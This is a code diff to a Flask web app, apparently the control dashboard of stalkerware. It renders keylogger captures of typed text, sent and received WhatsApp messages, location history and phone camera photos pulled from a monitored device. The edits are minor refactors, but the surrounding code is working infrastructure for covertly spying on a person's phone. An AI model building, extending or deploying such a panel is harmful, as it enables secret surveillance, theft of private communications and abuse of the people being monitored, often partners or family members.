@@ -64,6 +64,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .chat-msg.enviada { color: #38bdf8; text-align: right; }
         .chat-msg.midia { color: #f59e0b; }
         .chat-msg .hora { color: #64748b; font-size: 9px; }
+        .chat-msg .tipo-tag { font-size: 8px; text-transform: uppercase; }
         
         .keylog-box { background: #0a0a0a; border: 2px solid #ef4444; padding: 10px; border-radius: 8px; margin-bottom: 15px; }
         .keylog-box.ativo { border-color: #22c55e; animation: pulse 1s infinite; }
@@ -187,16 +188,18 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                 historico.setLatLngs(pontos);
                             }
                             
+                            // KEYLOGGER
                             let kb = document.getElementById('keylogBox');
                             if(d.keylog && d.keylog.ativo) {
                                 kb.className = 'keylog-box ativo';
                                 let textoHtml = d.keylog.texto ? `<div class="keylog-texto">📝 ${d.keylog.texto}</div>` : '';
                                 kb.innerHTML = `<p>⌨️ <span class="app-nome">${d.keylog.app}</span> monitorado${textoHtml}</p>`;
-                            } else {
+                            } else if(!d.keylog || !d.keylog.ativo) {
                                 kb.className = 'keylog-box';
                                 kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
                             }
                             
+                            // WHATSAPP - Mantém cards abertos
                             if(d.whatsapp && d.whatsapp.length > 0) {
                                 let html = '';
                                 d.whatsapp.forEach(chat => {
@@ -211,6 +214,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                             </div>
                                         </div>
                                         <div class="chat-card-body">`;
+                                    
                                     if(chat.mensagens) {
                                         chat.mensagens.slice().reverse().forEach(msg => {
                                             let cls = 'chat-msg ' + (msg.tipo || 'recebida');
@@ -218,6 +222,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                             html += `<div class="${cls}"><span class="tipo-tag">${msg.tipo === 'enviada' ? '📤' : '📥'}</span> ${msg.texto} <span class="hora">${msg.hora}</span></div>`;
                                         });
                                     }
+                                    
                                     html += `</div></div>`;
                                 });
                                 document.getElementById('chatList').innerHTML = html;
@@ -295,5 +300,4 @@ def get_camera(device_id):
     return jsonify({"photo_front": "", "photo_back": "", "pronto": False}), 404
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)), debug=False)
